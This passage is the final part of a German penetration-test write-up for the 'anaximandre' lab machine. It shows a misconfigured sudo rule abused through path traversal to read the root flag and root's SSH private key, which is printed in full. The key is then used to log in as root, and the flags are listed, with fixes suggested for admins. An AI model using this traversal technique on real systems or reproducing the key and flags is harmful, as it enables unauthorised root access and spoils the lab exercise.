+                *   `sudo -u root /usr/bin/cat /home/chaz/../../root/root.txt` liest erfolgreich die Root-Flag: `<span class="password">a3cbb8984cf5f19086595c6a2f569786</span>`.
+                *   `sudo -u root /usr/bin/cat /home/chaz/../../root/.ssh/id_rsa` liest erfolgreich den privaten SSH-Schlüssel des Root-Benutzers.
+            Die unsichere `sudo`-Regel hat eine vollständige Kompromittierung ermöglicht, ohne eine Shell als Root zu benötigen, da sensible Dateien direkt gelesen werden können.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Root-Flag und Root-SSH-Schlüssel notieren. Den SSH-Schlüssel verwenden, um sich direkt als `root` anzumelden und vollen interaktiven Zugriff zu erhalten.<br><strong>Empfehlung (Admin):</strong> Die fehlerhafte `sudo`-Regel **sofort** korrigieren oder entfernen. Path Traversal in Pfadangaben verhindern. Wildcards und `NOPASSWD` in `sudoers` äußerst vorsichtig verwenden.</p>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">chaz@anaximandre:~$ <span class="command">sudo -u root /usr/bin/cat /home/chaz/../../root/root.txt</span></div>
+                     <pre>
+<span class="password" style="display: block; text-align: center;">a3cbb8984cf5f19086595c6a2f569786</span>
+</pre>
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt" style="color: yellow;">chaz@anaximandre:~$ <span class="command">sudo -u root /usr/bin/cat /home/chaz/../../root/.ssh/id_rsa</span></div>
+                     <pre>
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+</pre>
+                  </div>
+            </div>
+
+             <hr>
+
+             <p class="analysis"><strong>Analyse:</strong> Der ausgelesene private SSH-Schlüssel von `root` wird auf dem Angreifer-System in eine Datei namens `fuckroot` gespeichert (`vi fuckroot`). Die Berechtigungen der Datei werden auf `600` gesetzt (`chmod 600`), was für SSH-Schlüssel erforderlich ist. Anschließend wird versucht, sich mit diesem Schlüssel als `root` auf dem Zielsystem anzumelden (`ssh root@anaximandre.hmv -i fuckroot`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der SSH-Login ist erfolgreich! Nach Bestätigung des Host-Keys erhält der Pentester eine Root-Shell (`root@anaximandre:~#`). Dies bestätigt die vollständige Kompromittierung des Systems.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> System kompromittiert. Finale Bestätigungen, Beweissicherung, Bericht fertigstellen.<br><strong>Empfehlung (Admin):</strong> Kompromittierten SSH-Schlüssel aus `/root/.ssh/authorized_keys` entfernen. Root-Passwort ändern. Die ausgenutzten Schwachstellen (LFI in `/exemplos/codemirror.php`, unsichere Rsync-Konfiguration, unsichere `sudo`-Regel für `chaz`) beheben. System auf weitere Kompromittierungsanzeichen untersuchen.</p>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">vi fuckroot</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">chmod 600 fuckroot</span></div>
+                      <!-- Keine Ausgabe -->
+                  </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]<br>└─# <span class="command">ssh root@anaximandre.hmv -i fuckroot</span></div>
+                     <pre>
+The authenticity of host 'anaximandre.hmv (192.168.2.114)' can't be established.
+ED25519 key fingerprint is SHA256:o85UBW33V2ugBn//KUDlZfvvNNdrOBdQeG6ka39U7Bs.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'anaximandre.hmv' (ED25519) to the list of known hosts.
+Linux anaximandre.hmv 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sun Nov 27 16:44:45 2022 from 192.168.0.29
+<span class="password">root@anaximandre:~#</span> 
+</pre>
+                  </div>
+            </div>
+        </section>
+
+        <section id="flags">
+            <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /home/chaz/user.txt</span> <br>
+                        <span class="flag-content"><span class="password">d151c8ace0dbdd0ef23a3e3200f696f1</span></span>
+                    </div>
+                </center></div>
+
+                <div class="code-block"><center>
+                    <div class="terminal">
+                        <span class="command">cat /root/root.txt</span> <br>
+                        <span class="flag-content"><span class="password">a3cbb8984cf5f19086595c6a2f569786</span></span>
+                    </div>
+                 </center></div>
+            </div>
+        </section>
+ 
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 11. April 2023</p>
+    </footer>
+</body>
+</html>
